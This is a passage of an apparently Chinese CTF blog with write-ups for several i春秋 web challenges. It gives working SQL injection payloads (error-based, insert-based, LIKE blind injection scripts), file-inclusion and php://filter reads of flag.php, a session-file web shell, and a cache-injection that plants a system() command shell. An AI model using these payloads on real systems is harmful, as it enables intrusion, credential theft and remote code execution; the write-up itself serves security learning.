substr(md5($string . $keyb), <span class="number">0</span>, <span class="number">16</span>) . $string;</span><br><span class="line">	$string_length = strlen($string);</span><br><span class="line"></span><br><span class="line">	$result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	$box = range(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line"></span><br><span class="line">	$rndkey = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt;= <span class="number">255</span>; $i++) &#123;</span><br><span class="line">		$rndkey[$i] = ord($cryptkey[$i % $key_length]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> ($j = $i = <span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++) &#123;</span><br><span class="line">		$j = ($j + $box[$i] + $rndkey[$i]) % <span class="number">256</span>;</span><br><span class="line">		$tmp = $box[$i];</span><br><span class="line">		$box[$i] = $box[$j];</span><br><span class="line">		$box[$j] = $tmp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> ($a = $j = $i = <span class="number">0</span>; $i &lt; $string_length; $i++) &#123;</span><br><span class="line">		$a = ($a + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">		$j = ($j + $box[$a]) % <span class="number">256</span>;</span><br><span class="line">		$tmp = $box[$a];</span><br><span class="line">		$box[$a] = $box[$j];</span><br><span class="line">		$box[$j] = $tmp;</span><br><span class="line">		$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % <span class="number">256</span>]));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($operation == <span class="string">&#x27;DECODE&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> ((substr($result, <span class="number">0</span>, <span class="number">10</span>) == <span class="number">0</span> || substr($result, <span class="number">0</span>, <span class="number">10</span>) - time() &gt; <span class="number">0</span>) &amp;&amp; substr($result, <span class="number">10</span>, <span class="number">16</span>) == substr(md5(substr($result, <span class="number">26</span>) . $keyb), <span class="number">0</span>, <span class="number">16</span>)) &#123;</span><br><span class="line">			<span class="keyword">return</span> substr($result, <span class="number">26</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> $keyc . str_replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>, base64_encode($result));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>他的意思是 根据39f4zSTZu9c/laWu0cRvZq7i1XMDxPnf5e4en8EtDTYmIQRKLchr36IN+pSbn9NzBae3B5mwptxrbBjlQjWJCwb0JFa47wk和上面的解密方式，就可以得到flag</p>
<p>只要在最后加上一句话:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> authcode($string = <span class="string">&#x27;5f04rJx7uHz25mDp4vUfC0JB4Nx5nMvyQzHwjRb6kN88N+T9RRipbwbHDIcRWtqXjemcJit26oE1Vu6lpdQPZ6St/obCAEc&#x27;</span>, $operation = <span class="string">&#x27;DECODE&#x27;</span>, $key = <span class="string">&#x27;ichunqiu105&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>flag{e6240cc3-d3ea-41ec-9778-10f5ca5e308b}</p>
<h2 id="web——再见CMS"><a href="#web——再见CMS" class="headerlink" title="web——再见CMS"></a>web——再见CMS</h2><p>首先要看看是什么cms，然后再去查找出现过的漏洞，这里看了一下WP，说是看<strong>备案号</strong>可以查询得到，发现是齐博CMS<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210223133416.png" alt="img" style="zoom:67%;"><br>然后查询已有的漏洞:<br>先注册下账号，记录好自己的uid:3<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210223140407.png" alt="img"><br>该网站的漏洞是这样的：在该<br><a href="http://3893215cde9541e9ab9e40ed01fd1bca93c93c73b8774146.changame.ichunqiu.com/member/userinfo.php?job=edit&amp;step=2">http://3893215cde9541e9ab9e40ed01fd1bca93c93c73b8774146.changame.ichunqiu.com/member/userinfo.php?job=edit&amp;step=2</a> URL下存在sql注入漏洞，所以我们可以post</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">truename&#x3D;xxxx%0000&amp;Limitword[000]&#x3D;&amp;email&#x3D;123@qq.com&amp;provinceid&#x3D;,address&#x3D;(select user()) where uid&#x3D;3%23</span><br></pre></td></tr></table></figure>

<p>以上payload进行注入，这里解释一下:%00会被转义成\0而后面limitword[000]=空，则是说将truename里面的000替换为空，这是就只剩下一个\，update table set a=’111’,b=’222’ where uid=1假设更新信息的语句如上，那么代入内容则变成是:update table set a=’111\‘,b=’222’ where uid=1<br>那么替换的内容变成由本来的a=111变成a=111\‘,b= 而我们的语句此时我们再引入一个逗号作为分隔，就变成是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update table set a&#x3D;&#39;111\&#39;,b&#x3D;&#39;,select user() wher uid&#x3D;3#</span><br></pre></td></tr></table></figure>

<p>接下来继续注入:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210223144710.png" alt="img" style="zoom:67%;"><br>爆出库名，看了一下wp，说flag不在这里，猜测是在var/www/html/flag.php，那么这里为什么可以猜测知道这个绝对路径呢?<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210223145157.png" alt="img"><br>这里有一部分原因吧<br>接下来如何</p>
<h4 id="通过sql注入方式打开文件"><a href="#通过sql注入方式打开文件" class="headerlink" title="通过sql注入方式打开文件"></a><strong>通过sql注入方式打开文件</strong></h4><p>参考：<a href="https://www.cnblogs.com/blacksunny/p/8060028.html">https://www.cnblogs.com/blacksunny/p/8060028.html</a><br>但是这里的单引号被过滤 所以就用十六进制表示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">truename&#x3D;xxxx%0000&amp;Limitword[000]&#x3D;&amp;email&#x3D;123@qq.com&amp;provinceid&#x3D;,address&#x3D;(select load_file(0x2f7661722f7777772f68746d6c2f666c61672e706870))where uid&#x3D;3%23</span><br><span class="line">&#x2F;&#x2F;select load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&#39;)</span><br></pre></td></tr></table></figure>

<p>查看源码即可获得flag<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210223145620.png" alt="img" style="zoom:67%;"></p>
<h2 id="web——notebook"><a href="#web——notebook" class="headerlink" title="web——notebook"></a>web——notebook</h2><p>提示说让我们使用文件包含看看，为什么会想到扫描目录？因为我用phpinfo尝试了很久都没打开==，扫描目录看到这个文件，他是php1nFo.php<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210223150710.png" alt="img"><br>接下来试试文件包含在哪：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210223150950.png" alt="img" style="zoom:67%;"><br>接下来看看有啥有用的信息吧，主要是毫无头绪不知道哪些信息对我有用，这里看了一下wp学习一下新知识:</p>
<h3 id="PHP文件包含–session"><a href="#PHP文件包含–session" class="headerlink" title="PHP文件包含–session"></a>PHP文件包含–session</h3><p><strong>利用条件</strong>：session文件路径已知，且其中内容部分可控。<br> php的session文件的保存路径可以在phpinfo的session.save_path看到。<br> session 的文件名格式为 sess_[phpsessid]，而 sessionid 在发送的请求的 cookie 字段中也可以看到。<br>思路:<br>所以这个时候就理顺了:<br>1.我们可以在phpinfo中看看session保存的目录在哪，然后使用文件包含漏洞打开，因为session文件命名规则我们也知道。<br>2.如何利用？我们注册用户，直接用php语句写入注册，由于文件包含漏洞打开文件会自动解析其中的php语言，所以我们就可以为所欲为了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210223152404.png" alt="img" style="zoom:67%;"><br>这个是session保存目录<br>PHPSESSID=u2vfju7a353mgv6j1tbch1pid7;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;action.php?module&#x3D;&amp;file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;SESS&#x2F;sess_u2vfju7a353mgv6j1tbch1pid7</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210223153333.png" alt="img" style="zoom:50%;">
注册并登录，然后就可以用蚁剑连接上面的文件包含的链接<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210223153439.png" alt="img" style="zoom:67%;">
就可以看到flag了

<h2 id="web——Vld"><a href="#web——Vld" class="headerlink" title="web——Vld"></a>web——Vld</h2><p>开头说</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">do you know Vulcan Logic Dumper?</span><br><span class="line">false</span><br></pre></td></tr></table></figure>

<p>这里留意一下这个Vulcan Logic Dumper,查看源码，</p>
<p>发现存在index.php.txt文件，打开以后可以得到一串代码内容，这个就是Vulcan Logic Dumper做的:<br>PHP内核-Zend引擎：<a href="http://www.php.cn/php-weizijiaocheng-355597.html">http://www.php.cn/php-weizijiaocheng-355597.html</a> PHP中的opcode：<a href="https://blog.csdn.net/weiyuanke/article/details/76921476">https://blog.csdn.net/weiyuanke/article/details/76921476</a> Vulcan Logic Dumper：<a href="http://www.phppan.com/2011/05/vld-extension/">http://www.phppan.com/2011/05/vld-extension/</a>  也就是说我们刚才看到的一堆代码其实就是借助vld得到的，php语言中供zend引擎执行的中间代码opcode。有了opcode便可以将其翻译成php代码。 网上也没找到翻译opcode的工具，所以只能看着对照表自己翻译:<br>参考学习：<a href="https://www.cnblogs.com/wosun/p/11386434.html">https://www.cnblogs.com/wosun/p/11386434.html</a></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210224100409.png" alt="img" style="zoom:67%;">
这里直接放翻译完的代码
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210224100654.png" alt="img" style="zoom:67%;">
传入值后，可以得到这个zip![img](https://raw.githubusercontent.com/Hwwg/myphoto/master/20210224102848.png)

<p>这里有个select语句，分析看看能不能注入：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$db = <span class="keyword">new</span> mysql_db();</span><br><span class="line">   $username = $db-&gt;safe_data($_POST[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">   $password = $db-&gt;my_md5($_POST[<span class="string">&#x27;password&#x27;</span>]);<span class="comment">//username经过mysql_db()的addslashes过滤</span></span><br><span class="line">   $number = is_numeric($_POST[<span class="string">&#x27;number&#x27;</span>]) ? $_POST[<span class="string">&#x27;number&#x27;</span>] : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">   $username = trim(str_replace($number, <span class="string">&#x27;&#x27;</span>, $username));<span class="comment">//将username里面的number换成空格然后再清空</span></span><br><span class="line"></span><br><span class="line">   $sql = <span class="string">&quot;select * from&quot;</span>.<span class="string">&quot;`&quot;</span>.table_name.<span class="string">&quot;`&quot;</span>.<span class="string">&quot;where username=&quot;</span>.<span class="string">&quot;&#x27;&quot;</span>.<span class="string">&quot;<span class="subst">$username</span>&quot;</span>.<span class="string">&quot;&#x27;&quot;</span>;<span class="comment">//这里其实还是以单引号闭合用点连接罢了</span></span><br><span class="line">   $row = $db-&gt;query($sql);</span><br><span class="line">   $result = $db-&gt;fetch_array($row);</span><br></pre></td></tr></table></figure>

<p>这里看了一下wp如何绕过，发现就是昨天刚用的方法–这次就一定要记住了<br>在这里str_replace的内容是我们可控的，我们知道%00会被转义成/0所以<br>我们让str_replace的替换为0这样username只剩下/，然后将后面接上单引号，，而单引号会被转义加上/那么此时前面的/就将这个/给转义掉’就逃逸出来了。<br>构造payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">number&#x3D;0&amp;username&#x3D;%00&#39;and extractvalue(1,concat(2,database()))#&amp;password&#x3D;123&amp;submit&#x3D;%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>

<p>但是 网页上的这个login.php404了？？？？？？？？后来发现原来目录是:<br>1chunqiu/login.php<br>我吐了，之前就遇到过，<strong>目录目录目录要完整！！</strong>重要的事情说三遍<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210224133352.png" alt="img" style="zoom:67%;"><br>然后一步步查询下去，最终可得</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">number&#x3D;0&amp;username&#x3D;%00&#39;and extractvalue(1,concat(2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())))#&amp;password&#x3D;123&amp;submit&#x3D;%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">number&#x3D;00&amp;username&#x3D;%000&#39;and extractvalue(1,concat(2,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x666c6167)))#&amp;password&#x3D;123&amp;submit&#x3D;%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>

<p>这里有个地方需要注意的是，我们前面替换的是0，因为会过滤引号，所以=后面需要使用十六进制进行绕过，但是使用十六进制有0所以这里替换的改成00就好了<br>得到字段名为flag:<br>由于报错注入一次回显内容有长度限制，一开始使用的select flag from flag就没办法完全将flag显示出来，所以这里改用substr</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">number&#x3D;00&amp;username&#x3D;%000&#39; and extractvalue(1,substr((select flag from flag),9,37))#&amp;password&#x3D;123&amp;submit&#x3D;%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>

<p>flag{19b41a74-3424-42d1-aeda-974812111573}</p>
]]></content>
  </entry>
  <entry>
    <title>i春秋8</title>
    <url>/2021/02/24/i%E6%98%A5%E7%A7%8B8/</url>
    <content><![CDATA[<h2 id="web——blog"><a href="#web——blog" class="headerlink" title="web——blog"></a>web——blog</h2><p>尝试注入无果，决定注册登录看看，在看到可以上传图片的时候，试试文件上传，发现报错： <a id="more"></a><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210224141514.png" alt="img" style="zoom:50%;"><br>得知是kindeditor，寻找漏洞:<a href="https://www.jb51.net/hack/367946.html">https://www.jb51.net/hack/367946.html</a><br>尝试漏洞:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;kindeditor&#x2F;php&#x2F;file_manager_json.php?path&#x3D;</span><br></pre></td></tr></table></figure>

<p>目录下存在文件包含漏洞<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210224144019.png" alt="img" style="zoom:67%;"><br>但由于该漏洞只是目录遍历漏洞，所以没办法查看，于是回到前面，在post页面尝试一下sql注入，存在注入点，但是由于不知道列名所以union select一直使用不了，如果是过滤的话，当我输入select前台是可以回显的看一下wp，说是insert注入:<br>1.推断insert的字段数——4个：payload:4’,’5’)# 此时没有报错<br>2.构造注入语句，查看可回显字段位置，这里有个点，当我对后面的内容进行闭合注释的时候，发现网页是无回显内容的，推测可能注释了什么关键指令导致页面无法回显，所以这里的payload应写为:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;),(&#x27;</span>aaa<span class="string">&#x27;,(select database()),&#x27;</span>c <span class="comment">//miniblog</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;),(&#x27;</span>aaa<span class="string">&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&#x27;</span>c<span class="comment">//posts,users</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;),(&#x27;</span>aaa<span class="string">&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),&#x27;</span>c<span class="comment">//usernmae，password </span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;),(&#x27;</span>aaa<span class="string">&#x27;,(select group_concat(password) from users),&#x27;</span>c    <span class="comment">//dbb616c5d935d8f34c12c291066d6fb7——&gt;melody123</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用管理员账号密码登录发现有个manage页面，查看，有文件包含漏洞，但是依旧无法看源代码<br><strong>法一</strong>：使用php://filter封装协议进行查看</p>
<p>flag{838c24a1-64d7-413b-8499-0ce7e32e0bef}<br>参考学习:<a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/</a><br>**法二:**来自张力学长的博客:<br>manager.php自包含产生栈溢出，down掉程序，php自启程序，但是写入的$_FILES[‘tmp’]存储在/tmp中没有被删除。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：?module&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64encode&#x2F;resource&#x3D;..&#x2F;flag.php&amp;name&#x3D;</span><br></pre></td></tr></table></figure>

<p>flag{838c24a1-64d7-413b-8499-0ce7e32e0bef}<br>参考学习:<a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/</a><br>**法二:**来自张力学长的博客:<br>manager.php自包含产生栈溢出，down掉程序，php自启程序，但是写入的$_FILES[‘tmp’]存储在/tmp中没有被删除。看都看不懂–先学习一下原理再来补充</p>
<h3 id="思路小结"><a href="#思路小结" class="headerlink" title="思路小结"></a>思路小结</h3><p>整理一下这题的思路吧，看到login页面推测是注入——注入无果，注册账号登录页面继续探索——尝试上传木马来getshell，发现根本上传不了——看到路径信息，还有编辑器的名字——百度搜索已有漏洞，发现有文件浏览遍历漏洞——发现flag.php，无法使用php封装协议故无法打开源码——回到页面去寻找线索，在post页面尝试SQL注入，发现有注入点于是开始尝试注入——注入成功获得admin的密码——登录得到新页面manage——再次看到文件包含漏洞，发现可以使用php封装协议，读取源代码——获得flag</p>
<h2 id="web——OneThink"><a href="#web——OneThink" class="headerlink" title="web——OneThink"></a>web——OneThink</h2><p>原理在这里:<a href="https://ca3tie1.github.io/post/onethink10-code-execute-writeup/">https://ca3tie1.github.io/post/onethink10-code-execute-writeup/</a><br>总结起来就是:<br>我们注册的username会被缓存写入缓存文件夹中并进行注释，使得其中内容不会被执行，当我们在插入数据的前面添加换行符，我们的语句就绕过了注释符，就可以被执行，登录之后就会生成Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php文件夹，访问即可<br>首先确定我们想要插入的语句，这里就直接使用system拿flag吧:<br>$a=$_GET[‘a’];<br>system($a);<br>这里需要分两次进行注册，因为有长度限制</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210225001159.png" alt="img" style="zoom:67%;">
![img](https://raw.githubusercontent.com/Hwwg/myphoto/master/20210225122023.png)
这里说一下为啥需要url解码两次:
1.我们没办法直接打出有换行符的用户名，所以我们先借助url编码后的换行符，传入以后会经过urlcode，这个时候就变成了%250a,经过一次解码后变成%0a就不是换行符了，所以我们先打出%0a到burp suit里面，将其两次解码成换行符，然后会经过一次urlcod变成%0a接下来就会再次被解码为换行符了，就达到我们的目的了
**PS：**每次注册完都要登录，才会被写入缓存文件当中
访问一下链接，查看源码就可以看到flag了

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Runtime&#x2F;Temp&#x2F;2bb202459c30a1628513f40ab22fa01a.php?a&#x3D;cat ..&#x2F;..&#x2F;flag.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;8e5702a3-5a1c-467b-9ad9-c771bd65dfea&#125;</span><br></pre></td></tr></table></figure>

<p>吐槽一波 这个简单是简单，就是太恶心了吧，验证码经常出错–，每次还要连续按两次啊</p>
<h2 id="web——攻击"><a href="#web——攻击" class="headerlink" title="web——攻击"></a>web——攻击</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;u/ip.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (in_array($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],$ip))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;您的ip已进入系统黑名单&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">var_dump($ip);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_POST[substr($flag,<span class="number">5</span>,<span class="number">3</span>)]==<span class="string">&#x27;attack&#x27;</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (count($_POST)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">  $ip = <span class="string">&#x27;$ip[]=&quot;&#x27;</span>.$_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>].<span class="string">&#x27;&quot;;&#x27;</span>.PHP_EOL; </span><br><span class="line">  file_put_contents(<span class="string">&#x27;u/ip.php&#x27;</span>,$ip,FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>根据以上代码我们可以知道，他一个ip只能攻击一次，但是它没对一次可以post的数据量限制，所以我们可以创建一个大字典，直接一起提交上去，他这边需要我们提交的是从flag第5位开始，一共三位的字符串，python脚本如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">a = <span class="string">&quot;0123456789abcdefgh&quot;</span></span><br><span class="line">data = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> a:</span><br><span class="line">            data[i+j+k]=<span class="string">&quot;attack&quot;</span></span><br><span class="line">print(data)</span><br><span class="line">s=requests.post(<span class="string">&quot;http://ff9c93ad21d04a7982ebe8103dba94498e3845a6b33f49f5.changame.ichunqiu.com/&quot;</span>,data=data)</span><br><span class="line">print(s.text)</span><br></pre></td></tr></table></figure>

<p>flag{269f92bb-9d65-44fc-8436-806b0bb6c5d1}</p>
<h2 id="web——时间"><a href="#web——时间" class="headerlink" title="web——时间:"></a>web——时间:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="string">&#x27;天下武功唯快不破&#x27;</span>;</span><br><span class="line">setcookie(<span class="string">&#x27;token&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> ($_COOKIE[<span class="string">&#x27;token&#x27;</span>]==<span class="string">&#x27;hello&#x27;</span>)&#123;</span><br><span class="line">  $txt = file_get_contents(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">  $filename = <span class="string">&#x27;u/&#x27;</span>.md5(mt_rand(<span class="number">1</span>,<span class="number">1000</span>)).<span class="string">&#x27;.txt&#x27;</span>;<span class="comment">//生成一个随机txt文件</span></span><br><span class="line">  file_put_contents($filename,$txt);<span class="comment">//将flag.php的内容写入txt中</span></span><br><span class="line">  sleep(<span class="number">10</span>);</span><br><span class="line">  unlink($filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以是这样的，当我们用名为token值为hello的cookie访问页面的时候，会生成一个随机txt文件，并且flag.php的内容会写入其中，经过十秒后，文件就会被删除，<br>1.先生成一个md5加密的文件名字典：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    print(<span class="string">&#x27;u/&#x27;</span>+hashlib.md5(str(i).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()+<span class="string">&#x27;.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>这里既可以使用burpsuit去跑，也可以用御剑去跑，可能要多尝试几次，毕竟只有十秒钟，或者线程调大一些<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210225125956.png" alt="img" style="zoom:67%;"></p>
<p>1<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210225130049.png" alt="img" style="zoom:67%;"></p>
<p>flag{913f76f9-9af0-4f9d-8c5b-a2195e64bd22}</p>
<h2 id="web——登录"><a href="#web——登录" class="headerlink" title="web——登录"></a>web——登录</h2><p>有个登录框：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;or 1&#x3D;1#</span><br><span class="line">admin&#39;or 1&#x3D;2#</span><br></pre></td></tr></table></figure>

<p>回显不一样 第一个密码错误，第二个用户名错误，存在注入，burp suit跑一下看看过滤了什么<br>:<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210225131028.png" alt="img" style="zoom:67%;"><br>记得以前看过like可以盲注，今天来学习一下:</p>
<h3 id="LIKE语法"><a href="#LIKE语法" class="headerlink" title="LIKE语法"></a>LIKE语法</h3><p>LIKE语句的语法格式是:<br>*<em>select * from 表名 where 字段名 like 对应值（子串）*</em><br>它主要是针对字符型字段，它的作用是在一个字符型字段列中检索包含对应子串。<br><strong>例子：</strong><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210225143939.png" alt="img" style="zoom:67%;"></p>
<p>后面的%是一个通配符还有常用<br>更多的通配符参考：</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210225144541.png" alt="img" style="zoom:67%;">

<p>_代表一个字符，例如D___就代表显示出以D为首后面接三个字符的数据<br><a href="https://blog.csdn.net/derpvailzhangfan/article/details/2452064">https://blog.csdn.net/derpvailzhangfan/article/details/2452064</a><br>而这里是不区分大小写的</p>
<h4 id="构造盲注语句"><a href="#构造盲注语句" class="headerlink" title="构造盲注语句"></a>构造盲注语句</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;or user_n3me like &#39;X%&#39;#</span><br><span class="line">1&#39;or p3ss_w0rd like &#39;X%&#39;#</span><br></pre></td></tr></table></figure>

<p>这里说明一下为什么字段名为这两个，其实有点猜测的成分在这里，因为这题大部分函数都过滤了，所以想要得出字段名只能靠猜测，想起来之前也有一题也是这样的，字段名就藏在网页提交表单的表名中<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210225150405.png" alt="img" style="zoom:67%;"></p>
<p>接下来的任务就是编写盲注脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">r&quot;http://15de6b62f20a4f5ba230856fe9419aeef1b157ed7220439a.changame.ichunqiu.com/Challenges/login.php&quot;</span></span><br><span class="line">headers=s.get(url).headers</span><br><span class="line">username=<span class="string">&#x27;&#x27;</span></span><br><span class="line">password=<span class="string">&#x27;&#x27;</span></span><br><span class="line">pay_try=<span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pay_try:</span><br><span class="line">        payload = <span class="string">f&quot;1&#x27;or user_n3me like &#x27;<span class="subst">&#123;username + i&#125;</span>%&#x27;#&quot;</span></span><br><span class="line">        data = &#123;<span class="string">&#x27;username&#x27;</span>: payload, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;test&#x27;</span>&#125;</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> <span class="keyword">in</span> s.post(url, data=data).text:</span><br><span class="line">            username += i</span><br><span class="line">            print(username)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>得到用户名bctf3dm1n。密码的爆破就把payload的内容更换一下，这里说一下这个长度，由于我比较懒，所以就没爆破长度，直接去试，如果想要先爆破长度可以这样将like后面的内容换成_并且随着循环次数的增加_的数量会增加，if的判断是如果用户名错误，就直接终止整个程序</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210225153838.png" alt="img" style="zoom:67%;">
